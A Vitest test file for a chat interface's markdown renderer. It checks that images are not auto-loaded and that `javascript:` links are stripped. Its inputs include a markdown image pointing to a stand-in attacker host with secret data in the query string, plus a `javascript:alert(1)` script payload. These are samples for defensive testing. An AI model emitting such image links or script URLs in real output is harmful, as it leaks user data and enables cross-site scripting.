import { renderToStaticMarkup } from "react-dom/server";
import { expect, test } from "vitest";
import { Md } from "./Chat";

test("markdown images are not loaded", () => {
  const html = renderToStaticMarkup(<Md text="![x](https://evil.example/?d=secret)" />);
  expect(html).not.toContain("<img");
  expect(html).toContain("[image: x] https://evil.example/?d=secret");
  expect(html).toContain('rel="noopener noreferrer"');
});

test("links open in a new tab; javascript: urls are dropped", () => {
  const html = renderToStaticMarkup(<Md text="[a](https://ok.example) [b](javascript:alert(1)) ![c](javascript:alert(1))" />);
  expect(html).toContain('<a href="https://ok.example" target="_blank" rel="noopener noreferrer">a</a>');
  expect(html).not.toContain("javascript:");
});
